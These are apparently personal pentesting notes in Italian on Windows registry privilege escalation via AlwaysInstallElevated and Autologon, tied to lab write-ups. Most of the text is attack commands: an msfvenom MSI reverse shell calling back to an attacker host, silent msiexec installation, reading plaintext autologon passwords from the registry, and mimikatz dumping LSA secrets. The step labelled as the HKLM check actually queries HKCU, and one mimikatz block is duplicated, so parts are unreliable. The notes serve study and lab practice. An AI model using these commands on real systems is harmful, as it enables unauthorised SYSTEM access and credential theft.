#Privesc_Windows 

---
#### INDICE

- [[#Introduzione]]
- [[#AlwaysInstallElevated]]
	1. [[#Enumerazione]]
	2. [[#Exploitation]]
- [[#Autologon]]
	1. [[#Enumerazione]]
	2. [[#Scenario 1 Credenziali in Chiaro]]
	3. [[#Scenario 2 Credenziali di Dominio]]
	4. [[#Scenario 3 Credenziali LSA]]

---
---
---
### Introduzione
Gli attacchi diÂ **Registry Privilege Escalation**Â sfruttano chiavi di registro configurate in modo insicuro per ottenere privilegi elevati. Il registry di Windows contiene impostazioni che controllano l'esecuzione automatica di programmi, permessi di servizi, e configurazioni di sicurezza. Quando queste chiavi hanno permessi di scrittura inappropriati o valori mal configurati, un utente normale puÃ² modificarle per eseguire codice con privilegi SYSTEM o Administrator.

---
### AlwaysInstallElevated
*AlwaysInstallElevated*Â Ã¨ una policy di Windows che, se abilitata, permette aÂ qualsiasi utenteÂ di installare MSI packages con privilegiÂ **SYSTEM**. Ãˆ una delle vulnerabilitÃ  piÃ¹ pericolose per l'escalation dei privilegi.
#### Enumerazione
Windows ha due registry key che controllano i privilegi di installazione:
- `HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`
- `HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated`

La vulnerabilitÃ  esiste quando **ENTRAMBE sono impostate a 0x1**.

Controlla la policy a livello di **sistema (HKLM):**

```
regÂ queryÂ HKCU\SOFTWARE\Policies\Microsoft\Windows\InstallerÂ /vÂ AlwaysInstallElevated
```

Controlla la policy a livello **utente (HKCU) :**

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Possibile automatizzare il processo con [winpeas.exe](https://github.com/peass-ng/PEASS-ng/releases/tag/20250904-27f4363e) o  [PowerUp.ps1](https://github.com/HarmJ0y/PowerUp):

```
. .\PowerUp.ps1
Invoke-AllChecks
```
#### Exploitation
Creiamo una *reverse shell* nel formato `.msi` e carichiamola sul target:

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=IP_KALI lport=1234 -f msi > installer.msi
```

Avviamo sulla macchina target l'installer per avviare una connessione con la nostra kali:

```
msiexecÂ /quietÂ /qnÂ /iÂ installer.msi
```

ğŸ“šâ€‹ Writeups:
- *Windows:*[[Windows#Love | Love]],[[Windows#Cyberlens | Cyberlens]],[[Windows#Weasel | Weasel]],

---
### Autologon
IlÂ **Autologon**Â di Windows Ã¨ una funzionalitÃ  che permette l'accesso automatico al sistema senza inserire le credenziali. Le password sono memorizzate nel registry in forma cifrata ma possono essere facilmente recuperate e decifrate.

Chiavi di Registry dell'Autologon Ã¨ `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`.
#### Enumerazione
Controlla se Autologon Ã¨ configurato

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon
```

Per automatizzare il processo possiamo utilizzare [winpeas.exe](https://github.com/peass-ng/PEASS-ng/releases/tag/20250904-27f4363e).
#### Scenario 1: Credenziali in Chiaro:
Se DefaultPassword Ã¨ presente, Ã¨ in CHIARO!

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

ğŸ“šâ€‹ Writeups:
- *Windows:*[[Windows#Chatterbox | Chatterbox]],
- *Active Directory:*[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Sauna| Sauna]],
#### Scenario 2: Credenziali di Dominio
Credenziali Domain:

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
```

Se ottieni password di dominio:

```
runas /user:DOMAIN\Administrator /savecred "cmd.exe"
```
#### Scenario 3: Credenziali LSA
Le password Autologon moderne sono in LSA Secrets, dobbiamo avvalerci dell'aiuto di [mimikatz.exe](https://github.com/ParrotSec/mimikatz):

```
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" exit
```

```
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" exit
```